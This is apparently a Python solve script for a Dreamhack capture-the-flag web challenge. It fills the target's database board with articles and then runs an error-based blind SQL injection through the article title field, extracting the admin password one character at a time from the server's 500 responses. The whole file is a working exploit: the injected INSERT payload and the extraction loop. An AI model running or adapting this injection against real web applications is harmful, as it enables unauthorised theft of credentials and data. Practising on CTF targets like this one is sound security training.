#!/usr/bin/env python3
import requests
import string

HOST = 'host3.dreamhack.games'
PORT = 20106

def login():
    """Sends login request and gets session.
    """
    data = {
        'username': 'guest',
        'password': 'guest'
    }
    res = session.post('http://%s:%d/login' % (HOST, PORT), data=data)
    return res

def delete_article(article_id):
    """Sends an article deletion request.
    """
    data = {
        'article_id': article_id,
        'answer': 'y'
    }
    done = False
    while not done:
        try:
            res = session.post('http://%s:%d/delete_article' % (HOST, PORT),
                               data=data,
                               timeout=2)
            done = True
        except Exception as e:
            print(e)
    return res

def write_article(title, content):
    """Sends a article creation request with given title and content.
    """
    data = {
        'title': title,
        'content': content
    }
    done = False
    while not done:
        try:
            res = session.post('http://%s:%d/write_article' % (HOST, PORT),
                               data=data,
                               timeout=2)
            done = True
        except Exception as e:
            print(e)
    return res

def delete_article_in_order():
    """Delete a article to secure some space for database.
    """
    global di

    res = delete_article(di)
    print('deleted a article..', di, res)
    di += 1

def fill_board_full():
    """Create articles until threshold of database size.
    """
    global session

    ci = 0
    while True:
        res = write_article('a' * 96, 'b' * 4096)
        print('filling board full..', ci, res)
        if res.status_code == 500:
            break
        ci += 1

session = requests.session()
di = 1
flag = ''
flag_idx = 1

def main():
    global flag, flag_idx

    found = False

    login()
    fill_board_full()
    delete_article_in_order()

    while True:

        for b in "0123456789ABCDEFGHIJKLMNOPQRSTWXYZabcdefghijklmnopqrstwxyz{}":
            print('trying..', b)

            if found:
                delete_article_in_order()
                found = False

            # SQLI
            title = "{0}', (0 div ((SELECT right(left(upw, {1}),1) FROM users WHERE " \
                         "uid=0x61646d696e)='{2}'))),('zz','{3}')#"
            title = title.format('c' * 96, flag_idx, b,'d' * 4096)
            print(title)

            for _ in range(4):
                res = write_article(title, 'z')

            if res.status_code == 500:
                flag += b
                print('flag..', flag)
                flag_idx += 1
                found = True
                break

        if b == '}':
            break

if __name__ == '__main__':
    main()